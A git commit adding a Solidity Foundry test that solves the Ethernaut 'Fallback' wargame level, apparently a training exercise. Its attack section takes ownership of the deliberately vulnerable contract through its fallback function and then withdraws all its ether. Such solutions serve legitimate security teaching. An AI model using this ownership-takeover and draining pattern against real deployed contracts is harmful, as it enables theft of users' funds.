e5424346e8040820640dd0efc899b060cf885a30
DDEENNY <a39955720@gmail.com>
2025-02-07 06:04:13 +0800

    01-fallback

---
+++ test/FallbackTest.t.sol
@@ -0,0 +1,46 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.27;
+
+import {Test, console} from "forge-std/Test.sol";
+import {StdCheats} from "forge-std/StdCheats.sol";
+import "../src/Fallback/FallbackFactory.sol";
+import "../src/Ethernaut.sol";
+
+contract FallbackTest is StdCheats, Test {
+    Ethernaut ethernaut;
+    address eoaAddress = address(100);
+
+    function setUp() public {
+        // Setup instance of the Ethernaut contract
+        ethernaut = new Ethernaut();
+        // Deal EOA address some ether
+        vm.deal(eoaAddress, 5 ether);
+    }
+
+    function testFallbackHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
+
+        FallbackFactory fallbackFactory = new FallbackFactory();
+        ethernaut.registerLevel(fallbackFactory);
+        vm.startPrank(eoaAddress);
+        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
+        Fallback ethernautFallback = Fallback(payable(levelAddress));
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+        ethernautFallback.contribute{value: 0.0009 ether}();
+        (bool success,) = address(ethernautFallback).call{value: 1 ether}("");
+        ethernautFallback.withdraw();
+
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        vm.stopPrank();
+        assert(levelSuccessfullyPassed);
+    }
+}
